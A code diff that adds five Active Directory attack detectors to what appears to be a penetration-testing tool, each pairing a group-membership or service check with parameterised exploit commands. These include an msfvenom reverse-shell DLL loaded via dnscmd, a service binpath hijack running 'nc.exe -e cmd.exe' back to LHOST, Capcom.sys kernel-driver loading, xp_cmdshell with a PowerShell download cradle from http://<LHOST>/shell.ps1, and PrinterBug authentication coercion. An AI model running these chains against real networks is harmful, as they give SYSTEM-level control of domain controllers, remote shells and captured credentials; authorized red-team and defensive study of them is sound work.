@@ -537,6 +537,664 @@ class LAPSDetector(DetectorBase):
         ]
 
 
+class DnsAdminsDetector(DetectorBase):
+    """
+    Detect membership in the DnsAdmins group.
+
+    DnsAdmins can instruct the DNS service (running as SYSTEM on DCs) to load
+    an arbitrary DLL via dnscmd. Restarting DNS executes the DLL as SYSTEM.
+
+    Reference: https://adsecurity.org/?p=4064
+               https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
+    """
+
+    @property
+    def indicator_name(self) -> str:
+        return "dnsadmins"
+
+    @property
+    def display_name(self) -> str:
+        return "DnsAdmins Group Membership"
+
+    @property
+    def description(self) -> str:
+        return "DnsAdmins can load arbitrary DLLs via DNS service - SYSTEM on DC."
+
+    def detect_from_ldap(
+        self,
+        users: List[Dict[str, Any]],
+        groups: List[Dict[str, Any]],
+        computers: List[Dict[str, Any]],
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        for group in groups:
+            name = group.get('name') or ''
+            if name.lower() == 'dnsadmins':
+                evidence.append(f"DnsAdmins group found: {name}")
+                members = group.get('members', [])
+                if members:
+                    evidence.append(f"  Members: {', '.join(members[:10])}")
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.CONFIRMED,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Stage a reverse-shell DLL on an SMB share reachable from the DC",
+                "Configure the DNS plugin path via dnscmd",
+                "Restart the DNS service to trigger DLL load as SYSTEM",
+            ],
+            references=[
+                "https://adsecurity.org/?p=4064",
+                "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
+            ],
+        )
+
+    def detect_from_bloodhound(
+        self,
+        neo4j_session,
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        query = """
+        MATCH (u)-[:MemberOf*1..]->(g:Group)
+        WHERE g.name =~ '(?i)DNSADMINS@.*'
+        RETURN u.name AS member, g.name AS group_name
+        LIMIT 20
+        """
+        try:
+            result = neo4j_session.run(query)
+            for record in result:
+                member = record.get('member') or ''
+                group_name = record.get('group_name') or ''
+                evidence.append(f"{member} -> {group_name}")
+        except Exception:
+            pass
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.CONFIRMED,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Verify DNS service is running on target DC",
+                "Confirm SMB write access for DLL staging",
+            ],
+            references=[
+                "https://adsecurity.org/?p=4064",
+            ],
+        )
+
+    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
+        lhost = context.get('lhost', '<LHOST>')
+        dc = context.get('dc_hostname', '<DC_HOSTNAME>')
+        return [
+            AttackCommand(
+                command=f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT=443 -f dll -o dns_plugin.dll",
+                description="Generate reverse-shell DLL payload",
+                explanation="The DNS service loads the plugin DLL as SYSTEM. A reverse-shell "
+                            "DLL gives immediate SYSTEM-level access on the domain controller.",
+                prerequisites=["Network access to stage DLL via SMB share"],
+                references=["https://github.com/rapid7/metasploit-framework"],
+            ),
+            AttackCommand(
+                command=f"dnscmd {dc} /config /serverlevelplugindll \\\\{lhost}\\share\\dns_plugin.dll",
+                description="Register malicious DLL with DNS service",
+                explanation="dnscmd writes the plugin path to the registry key "
+                            "HKLM\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll. "
+                            "DnsAdmins group has write access to this key via the DNS management protocol.",
+                prerequisites=["DnsAdmins group membership"],
+            ),
+            AttackCommand(
+                command=f"sc \\\\{dc} stop dns && sc \\\\{dc} start dns",
+                description="Restart DNS service to trigger DLL load",
+                explanation="The DNS service loads the plugin on startup. Restarting it executes "
+                            "the DLL as NT AUTHORITY\\SYSTEM, spawning the reverse shell.",
+                prerequisites=["DnsAdmins group membership (allows DNS service restart)"],
+                alternatives=[
+                    f"net stop dns /y && net start dns  # from DC session",
+                ],
+            ),
+        ]
+
+
+class ServerOperatorsDetector(DetectorBase):
+    """
+    Detect membership in the Server Operators group.
+
+    Server Operators can configure and restart services on domain controllers,
+    enabling binary-path hijack to execute arbitrary code as SYSTEM.
+
+    Reference: https://cube0x0.github.io/Pocing-Beyond-DA/
+    """
+
+    @property
+    def indicator_name(self) -> str:
+        return "server_operators"
+
+    @property
+    def display_name(self) -> str:
+        return "Server Operators Group Membership"
+
+    @property
+    def description(self) -> str:
+        return "Server Operators can modify and restart services on DCs - SYSTEM escalation."
+
+    def detect_from_ldap(
+        self,
+        users: List[Dict[str, Any]],
+        groups: List[Dict[str, Any]],
+        computers: List[Dict[str, Any]],
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        for group in groups:
+            name = group.get('name') or ''
+            if 'server operators' in name.lower():
+                evidence.append(f"Group found: {name}")
+                members = group.get('members', [])
+                if members:
+                    evidence.append(f"  Members: {', '.join(members[:10])}")
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.CONFIRMED,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Upload nc.exe or another reverse-shell binary to the DC",
+                "Reconfigure a stopped service's binary path",
+                "Start the service to execute as SYSTEM",
+            ],
+            references=[
+                "https://cube0x0.github.io/Pocing-Beyond-DA/",
+                "https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/",
+            ],
+        )
+
+    def detect_from_bloodhound(
+        self,
+        neo4j_session,
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        query = """
+        MATCH (u)-[:MemberOf*1..]->(g:Group)
+        WHERE g.name =~ '(?i)SERVER OPERATORS@.*'
+        RETURN u.name AS member, g.name AS group_name
+        LIMIT 20
+        """
+        try:
+            result = neo4j_session.run(query)
+            for record in result:
+                member = record.get('member') or ''
+                group_name = record.get('group_name') or ''
+                evidence.append(f"{member} -> {group_name}")
+        except Exception:
+            pass
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.CONFIRMED,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Confirm sc.exe access to target DC",
+            ],
+            references=["https://cube0x0.github.io/Pocing-Beyond-DA/"],
+        )
+
+    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
+        lhost = context.get('lhost', '<LHOST>')
+        lport = context.get('lport', '<LPORT>')
+        return [
+            AttackCommand(
+                command=f'sc config VSS binpath="C:\\\\Temp\\\\nc.exe -e cmd.exe {lhost} {lport}"',
+                description="Hijack VSS service binary path to reverse shell",
+                explanation="Server Operators have SC_MANAGER_ALL_ACCESS on DCs, allowing them "
+                            "to reconfigure any service binary path. VSS (Volume Shadow Copy) is "
+                            "typically stopped and safe to abuse without disrupting DC operations.",
+                prerequisites=["nc.exe uploaded to C:\\Temp\\ on the DC", "Server Operators membership"],
+                alternatives=[
+                    'sc config browser binpath="C:\\\\Temp\\\\nc.exe -e cmd.exe <LHOST> <LPORT>"',
+                ],
+                references=["https://cube0x0.github.io/Pocing-Beyond-Da/"],
+            ),
+            AttackCommand(
+                command="sc start VSS",
+                description="Start reconfigured service to execute payload",
+                explanation="Starting the service launches the hijacked binary path as "
+                            "NT AUTHORITY\\SYSTEM, establishing the reverse shell.",
+                prerequisites=["sc config step completed"],
+            ),
+        ]
+
+
+class PrintOperatorsDetector(DetectorBase):
+    """
+    Detect membership in the Print Operators group.
+
+    Print Operators are granted SeLoadDriverPrivilege on domain controllers,
+    which allows loading unsigned kernel drivers - a direct path to kernel-mode code execution.
+
+    Reference: https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/
+               https://github.com/FuzzySecurity/Capcom-Rootkit
+    """
+
+    @property
+    def indicator_name(self) -> str:
+        return "print_operators"
+
+    @property
+    def display_name(self) -> str:
+        return "Print Operators Group Membership"
+
+    @property
+    def description(self) -> str:
+        return "Print Operators have SeLoadDriverPrivilege - can load kernel drivers on DCs."
+
+    def detect_from_ldap(
+        self,
+        users: List[Dict[str, Any]],
+        groups: List[Dict[str, Any]],
+        computers: List[Dict[str, Any]],
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        for group in groups:
+            name = group.get('name') or ''
+            if 'print operators' in name.lower():
+                evidence.append(f"Group found: {name}")
+                members = group.get('members', [])
+                if members:
+                    evidence.append(f"  Members: {', '.join(members[:10])}")
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.CONFIRMED,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Confirm SeLoadDriverPrivilege is active in token (whoami /priv)",
+                "Use EoPLoadDriver to register a vulnerable driver (Capcom.sys)",
+                "Exploit Capcom.sys for ring-0 code execution",
+            ],
+            references=[
+                "https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/",
+                "https://github.com/FuzzySecurity/Capcom-Rootkit",
+            ],
+        )
+
+    def detect_from_bloodhound(
+        self,
+        neo4j_session,
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        query = """
+        MATCH (u)-[:MemberOf*1..]->(g:Group)
+        WHERE g.name =~ '(?i)PRINT OPERATORS@.*'
+        RETURN u.name AS member, g.name AS group_name
+        LIMIT 20
+        """
+        try:
+            result = neo4j_session.run(query)
+            for record in result:
+                member = record.get('member') or ''
+                group_name = record.get('group_name') or ''
+                evidence.append(f"{member} -> {group_name}")
+        except Exception:
+            pass
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.CONFIRMED,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Log into the DC and verify privilege with whoami /priv",
+            ],
+            references=["https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/"],
+        )
+
+    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
+        return [
+            AttackCommand(
+                command="whoami /priv | findstr SeLoadDriverPrivilege",
+                description="Verify SeLoadDriverPrivilege is present",
+                explanation="Print Operators receive SeLoadDriverPrivilege on DCs. This privilege "
+                            "allows registering new kernel drivers via NtLoadDriver(). It is not "
+                            "present by default for interactive logons - you may need to launch a "
+                            "new process as the Print Operators user.",
+                prerequisites=["Session on the domain controller as a Print Operators member"],
+            ),
+            AttackCommand(
+                command="EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Temp\\Capcom.sys",
+                description="Load vulnerable Capcom.sys driver using EoPLoadDriver",
+                explanation="EoPLoadDriver.exe (Tarlogic) abuses SeLoadDriverPrivilege to register "
+                            "a driver service key under HKCU (writable without elevation) and call "
+                            "NtLoadDriver(). Capcom.sys exposes a DeviceIoControl handler that "
+                            "executes caller-supplied shellcode in ring 0, bypassing DSE on older "
+                            "Windows versions.",
+                prerequisites=["SeLoadDriverPrivilege in token", "Capcom.sys on disk"],
+                references=[
+                    "https://github.com/TarlogicSecurity/EoPLoadDriver",
+                    "https://github.com/FuzzySecurity/Capcom-Rootkit",
+                    "https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/",
+                ],
+                alternatives=[
+                    "# On Windows 10+: combine with DSE bypass (e.g., CI.dll TOCTOU)",
+                    "# Alternative vulnerable drivers: RTCore64.sys, WinRing0x64.sys",
+                ],
+            ),
+            AttackCommand(
+                command="# Use ExploitCapcom.exe to execute SYSTEM shell via Capcom.sys IOCTL",
+                description="Achieve ring-0 code execution via Capcom.sys",
+                explanation="Capcom.sys IOCTL 0xAA013044 disables SMEP and executes a function "
+                            "pointer in ring 0. ExploitCapcom weaponizes this to add the current "
+                            "user to the local Administrators group or spawn a SYSTEM shell.",
+                prerequisites=["Capcom.sys successfully loaded"],
+                references=[
+                    "https://github.com/tandasat/ExploitCapcom",
+                ],
+            ),
+        ]
+
+
+class MSSQLLinkedServerDetector(DetectorBase):
+    """
+    Detect MSSQL instances with linked server configurations.
+
+    Linked servers allow one SQL Server instance to execute queries against another.
+    If xp_cmdshell or linked-server chaining is exploitable, lateral movement
+    across multiple SQL hosts is possible from a single credential.
+
+    Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+               https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/
+    """
+
+    @property
+    def indicator_name(self) -> str:
+        return "mssql_linked_server"
+
+    @property
+    def display_name(self) -> str:
+        return "MSSQL Linked Servers"
+
+    @property
+    def description(self) -> str:
+        return "MSSQL servers with linked server configurations enable lateral movement via xp_cmdshell chains."
+
+    def detect_from_ldap(
+        self,
+        users: List[Dict[str, Any]],
+        groups: List[Dict[str, Any]],
+        computers: List[Dict[str, Any]],
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        # MSSQLSvc SPNs on user objects indicate service accounts
+        for user in users:
+            spns = user.get('serviceprincipalnames') or user.get('spns') or []
+            for spn in spns:
+                if spn.startswith('MSSQLSvc/'):
+                    evidence.append(f"MSSQL SPN on user {user.get('name', '?')}: {spn}")
+        # MSSQLSvc SPNs on computer objects
+        for computer in computers:
+            spns = computer.get('serviceprincipalnames') or computer.get('spns') or []
+            for spn in spns:
+                if spn.startswith('MSSQLSvc/'):
+                    evidence.append(f"MSSQL SPN on computer {computer.get('name', '?')}: {spn}")
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.LIKELY,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Enumerate linked servers on each discovered MSSQL instance",
+                "Check if xp_cmdshell is enabled or can be enabled via linked server",
+                "Identify service account privileges (sysadmin role?)",
+            ],
+            references=[
+                "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server",
+                "https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
+            ],
+        )
+
+    def detect_from_bloodhound(
+        self,
+        neo4j_session,
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        evidence = []
+        query_computers = """
+        MATCH (c:Computer)
+        WHERE any(spn IN c.serviceprincipalnames WHERE spn STARTS WITH 'MSSQLSvc/')
+        RETURN c.name AS name, c.serviceprincipalnames AS spns
+        LIMIT 20
+        """
+        query_users = """
+        MATCH (u:User)
+        WHERE any(spn IN u.serviceprincipalnames WHERE spn STARTS WITH 'MSSQLSvc/')
+        RETURN u.name AS name, u.serviceprincipalnames AS spns
+        LIMIT 20
+        """
+        try:
+            result = neo4j_session.run(query_computers)
+            for record in result:
+                name = record.get('name') or ''
+                spns = [s for s in (record.get('spns') or []) if s.startswith('MSSQLSvc/')]
+                evidence.append(f"MSSQL computer: {name} ({', '.join(spns[:3])})")
+        except Exception:
+            pass
+        try:
+            result = neo4j_session.run(query_users)
+            for record in result:
+                name = record.get('name') or ''
+                spns = [s for s in (record.get('spns') or []) if s.startswith('MSSQLSvc/')]
+                evidence.append(f"MSSQL service account: {name} ({', '.join(spns[:3])})")
+        except Exception:
+            pass
+        if not evidence:
+            return None
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.LIKELY,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Attempt Kerberoasting on MSSQL service accounts",
+                "Connect to each instance and enumerate linked servers",
+            ],
+            references=[
+                "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server",
+            ],
+        )
+
+    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
+        target = context.get('target_ip', '<TARGET>')
+        user = context.get('username', '<USER>')
+        password = context.get('password', '<PASS>')
+        return [
+            AttackCommand(
+                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"SELECT srvname FROM master..sysservers\"",
+                description="Enumerate linked servers on the target MSSQL instance",
+                explanation="master..sysservers lists all linked servers configured on this instance. "
+                            "Each entry is a potential lateral movement target.",
+                prerequisites=["Valid credentials with SQL login rights"],
+                references=["https://github.com/byt3bl33d3r/CrackMapExec"],
+            ),
+            AttackCommand(
+                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [<LINKED_SERVER>]\"",
+                description="Enable advanced options on linked server",
+                explanation="Executing sp_configure via AT [linked_server] runs the command in the "
+                            "security context of the linked server's configured account. Enabling "
+                            "advanced options is the prerequisite for activating xp_cmdshell.",
+                prerequisites=["Linked server discovered", "Linked account has sysadmin or sufficient rights"],
+            ),
+            AttackCommand(
+                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED_SERVER>]\"",
+                description="Enable xp_cmdshell on linked server",
+                explanation="xp_cmdshell spawns a Windows command shell from the SQL Server process "
+                            "account. Once enabled on the linked server, arbitrary OS commands run "
+                            "in that server's security context.",
+            ),
+            AttackCommand(
+                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>]\"",
+                description="Execute OS command via xp_cmdshell on linked server",
+                explanation="Confirms code execution context on the linked server. Replace 'whoami' "
+                            "with a PowerShell download-cradle or reverse shell one-liner for "
+                            "full shell access.",
+                alternatives=[
+                    "EXEC ('xp_cmdshell ''powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://<LHOST>/shell.ps1\\\")\"''') AT [<LINKED_SERVER>]",
+                ],
+                references=[
+                    "https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
+                ],
+            ),
+        ]
+
+
+class PrintSpoolerDetector(DetectorBase):
+    """
+    Detect Print Spooler service running on domain controllers.
+
+    The MS-RPRN protocol (Print Spooler) exposes RpcRemoteFindFirstPrinterChangeNotification,
+    which can be triggered by any authenticated user to force the DC to authenticate to
+    an attacker-controlled host. Combined with unconstrained delegation or NTLM relay,
+    this achieves domain compromise.
+
+    Known as: PrinterBug, SpoolSample
+    CVE: No CVE assigned (by-design protocol behavior)
+
+    Reference: https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-df0724100
+               https://github.com/leechristopher/SpoolSample
+               https://github.com/dirkjanm/krbrelayx
+    """
+
+    @property
+    def indicator_name(self) -> str:
+        return "print_spooler"
+
+    @property
+    def display_name(self) -> str:
+        return "Print Spooler Service (Coercion Target)"
+
+    @property
+    def description(self) -> str:
+        return "Print Spooler enables PrinterBug/SpoolSample coercion for NTLM relay or unconstrained delegation abuse."
+
+    def detect_from_bloodhound(
+        self,
+        neo4j_session,
+        context: Dict[str, str],
+    ) -> Optional[DetectionResult]:
+        # BloodHound CE does not reliably track spooler service state.
+        # Flag all DCs as candidates - spooler has historically been on by default.
+        evidence = []
+        query = """
+        MATCH (c:Computer)
+        WHERE c.unconstraineddelegation = true
+        RETURN c.name AS name
+        LIMIT 20
+        """
+        try:
+            result = neo4j_session.run(query)
+            for record in result:
+                name = record.get('name') or ''
+                evidence.append(f"Unconstrained delegation host (likely DC): {name} - verify spooler via rpcdump")
+        except Exception:
+            pass
+        # Always surface this check for DCs - spooler runs by default on all supported Windows versions
+        evidence.append(
+            "All DCs should be tested for MS-RPRN availability - Print Spooler runs by default"
+        )
+        return DetectionResult(
+            indicator=self.indicator_name,
+            name=self.display_name,
+            confidence=DetectionConfidence.POSSIBLE,
+            evidence=evidence,
+            attack_commands=self.get_exploit_commands(context),
+            next_steps=[
+                "Confirm MS-RPRN is exposed via rpcdump",
+                "Set up Responder or krbrelayx to capture/relay coerced authentication",
+                "Trigger coercion from any authenticated domain account",
+            ],
+            references=[
+                "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-df0724100",
+                "https://github.com/dirkjanm/krbrelayx",
+                "https://github.com/leechristopher/SpoolSample",
+            ],
+        )
+
+    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
+        target = context.get('target_ip', '<TARGET>')
+        domain = context.get('domain', '<DOMAIN>')
+        user = context.get('username', '<USER>')
+        password = context.get('password', '<PASS>')
+        attacker = context.get('lhost', '<ATTACKER_HOST>')
+        return [
+            AttackCommand(
+                command=f"python3 rpcdump.py @{target} | grep MS-RPRN",
+                description="Check if Print Spooler (MS-RPRN) is accessible",
+                explanation="rpcdump.py (impacket) lists all RPC endpoints. MS-RPRN present "
+                            "means the spooler pipe is reachable and coercion is possible. "
+                            "Absence does not guarantee safety - the service may still respond "
+                            "over named pipes.",
+                prerequisites=["impacket installed", "Network access to target RPC port (135)"],
+                references=["https://github.com/fortra/impacket"],
+            ),
+            AttackCommand(
+                command=f"python3 SpoolSample.py {target} {attacker}",
+                description="Trigger DC authentication to attacker host via PrinterBug",
+                explanation="SpoolSample calls RpcRemoteFindFirstPrinterChangeNotification on the "
+                            "target DC, forcing it to authenticate to <attacker_host>. The resulting "
+                            "TGT (if attacker has unconstrained delegation) or Net-NTLMv2 hash "
+                            "(if using Responder/NTLM relay) can be captured and abused.",
+                prerequisites=[
+                    "Valid domain credentials",
+                    "Listener running on attacker host (Responder, ntlmrelayx, or krbrelayx)",
+                ],
+                references=["https://github.com/leechristopher/SpoolSample"],
+                alternatives=[
+                    f"python3 printerbug.py {domain}/{user}:{password}@{target} {attacker}",
+                    f"Invoke-SpoolSample -Target {target} -CaptureServer {attacker}  # PowerShell",
+                ],
+            ),
+            AttackCommand(
+                command=f"python3 printerbug.py {domain}/{user}:{password}@{target} {attacker}",
+                description="Alternative coercion tool with credential support",
+                explanation="printerbug.py (dirkjanm) wraps the same MS-RPRN abuse with explicit "
+                            "credential passing, useful when you have plaintext creds but no Kerberos "
+                            "ticket. Pair with krbrelayx on the attacker host for TGT capture when "
+                            "a host with unconstrained delegation is the listener.",
+                prerequisites=["Valid domain credentials", "krbrelayx or Responder listening on attacker host"],
+                references=[
+                    "https://github.com/dirkjanm/krbrelayx",
+                    "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/",
+                ],
+            ),
+        ]
+
+
 class DetectorRegistry:
     """
     Registry of attack vector detectors.
@@ -598,4 +1256,9 @@ def get_default_registry() -> DetectorRegistry:
     registry.register(AzureADConnectDetector())
     registry.register(GPPPasswordDetector())
     registry.register(LAPSDetector())
+    registry.register(DnsAdminsDetector())
+    registry.register(ServerOperatorsDetector())
+    registry.register(PrintOperatorsDetector())
+    registry.register(MSSQLLinkedServerDetector())
+    registry.register(PrintSpoolerDetector())
     return registry
